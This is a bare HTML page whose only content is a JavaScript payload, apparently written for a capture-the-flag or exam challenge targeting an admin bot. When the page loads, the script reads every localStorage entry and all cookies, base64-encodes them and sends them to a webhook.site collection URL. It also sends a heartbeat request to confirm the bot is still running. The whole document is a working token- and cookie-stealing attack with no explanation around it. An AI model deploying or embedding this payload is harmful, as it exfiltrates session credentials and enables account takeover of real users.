<!DOCTYPE html>
<html>
<body>
   <script>
    const webhook = "https://webhook.site/841a65c5-0695-459d-80da-91ae7613c283";
    
    // 1. Try to grab the Token from LocalStorage (Most likely for this exam)
    // We search for common keys like 'token', 'accessToken', or 'auth'
    for (let i = 0; i < localStorage.length; i++) {
        let key = localStorage.key(i);
        let value = localStorage.getItem(key);
        fetch(webhook + "?key=" + key + "&value=" + btoa(value));
    }

    // 2. Try to grab Cookies
    if (document.cookie) {
        fetch(webhook + "?cookies=" + btoa(document.cookie));
    }

    // 3. Heartbeat - Just to confirm the bot is still alive
    fetch(webhook + "?status=alive_and_running");
</script>
</body>
</html>
